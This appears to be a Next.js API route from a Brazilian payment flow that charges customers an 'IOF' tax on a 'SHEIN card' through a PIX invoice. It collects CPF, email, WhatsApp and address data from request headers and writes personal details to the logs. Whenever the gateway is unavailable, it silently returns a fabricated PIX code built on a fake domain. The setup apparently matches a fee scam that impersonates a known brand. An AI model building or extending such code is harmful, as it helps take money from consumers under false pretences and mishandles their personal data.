import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("🔄 [IOF API] Iniciando criação de fatura IOF...")

    // Verificar variáveis de ambiente
    const apiUrl = process.env.TRYPLOPAY_API_URL
    const token = process.env.TRYPLOPAY_TOKEN
    const secretKey = process.env.TRYPLOPAY_SECRET_KEY

    console.log("🔧 [IOF API] Verificando configurações:", {
      apiUrl: apiUrl ? "✅ Configurado" : "❌ Não configurado",
      token: token ? "✅ Configurado" : "❌ Não configurado",
      secretKey: secretKey ? "✅ Configurado" : "❌ Não configurado",
    })

    if (!apiUrl || !token || !secretKey) {
      console.log("❌ [IOF API] Variáveis de ambiente não configuradas, usando fallback")
      return createSimulatedIOFInvoice(request)
    }

    // Obter dados do request
    const body = await request.json()
    const { amount } = body

    // Obter dados dos headers
    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
    const userEmail = request.headers.get("x-user-email") || ""
    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
    const deliveryAddress = JSON.parse(request.headers.get("x-delivery-address") || "{}")

    console.log("📋 [IOF API] Dados recebidos:", {
      amount,
      cliente: cpfData.nome,
      email: userEmail,
      whatsapp: userWhatsApp,
    })

    // Gerar external_id único para IOF
    const externalId = `SHEIN_IOF_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`

    // Preparar payload para TryploPay
    const tryploPayload = {
      amount: Math.round(amount * 100), // Converter para centavos
      external_id: externalId,
      description: `IOF - Imposto sobre Operações Financeiras - Cartão SHEIN`,
      customer: {
        name: cpfData.nome || "Cliente SHEIN",
        email: userEmail || "cliente@shein.com",
        phone: userWhatsApp || "",
        document: cpfData.cpf?.replace(/\D/g, "") || "",
      },
      notification_url: `${process.env.NEXT_PUBLIC_SITE_URL}/api/tryplopay/webhook`,
      return_url: `${process.env.NEXT_PUBLIC_SITE_URL}/upp/success`,
      expires_in: 600, // 10 minutos
    }

    console.log("📤 [IOF API] Enviando para TryploPay:", {
      url: `${apiUrl}/invoices`,
      external_id: externalId,
      amount: amount,
      customer: tryploPayload.customer.name,
    })

    // Fazer requisição para TryploPay
    const response = await fetch(`${apiUrl}/invoices`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${token}`,
        "X-Secret-Key": secretKey,
      },
      body: JSON.stringify(tryploPayload),
    })

    const responseData = await response.json()

    console.log("📥 [IOF API] Resposta TryploPay:", {
      status: response.status,
      success: response.ok,
      hasData: !!responseData,
    })

    if (response.ok && responseData) {
      // Processar resposta de sucesso
      const invoiceData = {
        id: responseData.id || externalId,
        invoice_id: responseData.invoice_id || responseData.id,
        external_id: externalId,
        pix: {
          payload: responseData.pix?.payload || responseData.pix_code || "",
          image: responseData.pix?.image || "",
          qr_code:
            responseData.pix?.qr_code ||
            `https://quickchart.io/qr?text=${encodeURIComponent(responseData.pix?.payload || "")}`,
        },
        status: {
          code: responseData.status?.code || 1,
          title: responseData.status?.title || "Aguardando Pagamento",
          text: responseData.status?.text || "pending",
        },
        valores: {
          bruto: responseData.amount || Math.round(amount * 100),
          liquido: responseData.amount || Math.round(amount * 100),
        },
        vencimento: {
          dia: responseData.expires_at || new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "real" as const,
      }

      console.log("✅ [IOF API] Fatura IOF REAL criada com sucesso!")
      console.log(`💰 Valor: R$ ${amount.toFixed(2)}`)
      console.log(`🆔 External ID: ${externalId}`)
      console.log(`👤 Cliente: ${cpfData.nome}`)

      return NextResponse.json({
        success: true,
        data: invoiceData,
        type: "real",
        message: "Fatura IOF criada com sucesso",
      })
    } else {
      // Erro na API, usar fallback
      console.log("⚠️ [IOF API] Erro na API TryploPay, usando fallback:", responseData)
      return createSimulatedIOFInvoice(request)
    }
  } catch (error) {
    console.error("❌ [IOF API] Erro geral:", error)
    return createSimulatedIOFInvoice(request)
  }
}

async function createSimulatedIOFInvoice(request: NextRequest) {
  try {
    const body = await request.json()
    const { amount } = body

    // Obter dados dos headers
    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")

    console.log("🧪 [IOF API] Criando fatura IOF SIMULADA...")

    const externalId = `SHEIN_IOF_SIM_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    const totalAmount = Number.parseFloat(amount.toString())

    // Gerar PIX simulado
    const simulatedPix = `00020101021226580014br.gov.bcb.pix2536simulated.iof.com/qr/v2/IOF${Date.now()}520400005303986540${totalAmount.toFixed(2)}5802BR5909SHEIN IOF5011SAO PAULO62070503***6304SIMS`

    const simulatedInvoice = {
      id: `IOF_SIM_${Date.now()}`,
      invoice_id: `IOF_SIMULATED_${Date.now()}`,
      external_id: externalId,
      pix: {
        payload: simulatedPix,
        image: "/placeholder.svg?height=250&width=250",
        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(simulatedPix)}`,
      },
      status: {
        code: 1,
        title: "Aguardando Pagamento",
        text: "pending",
      },
      valores: {
        bruto: Math.round(totalAmount * 100),
        liquido: Math.round(totalAmount * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      type: "simulated" as const,
    }

    console.log("✅ [IOF API] Fatura IOF SIMULADA criada!")
    console.log(`💰 Valor: R$ ${totalAmount.toFixed(2)}`)
    console.log(`🆔 External ID: ${externalId}`)
    console.log(`👤 Cliente: ${cpfData.nome}`)

    return NextResponse.json({
      success: true,
      data: simulatedInvoice,
      type: "simulated",
      fallback: true,
      message: "Fatura IOF simulada criada (fallback)",
    })
  } catch (error) {
    console.error("❌ [IOF API] Erro ao criar fatura simulada:", error)
    return NextResponse.json({
      success: false,
      error: "Erro ao criar fatura IOF",
    })
  }
}
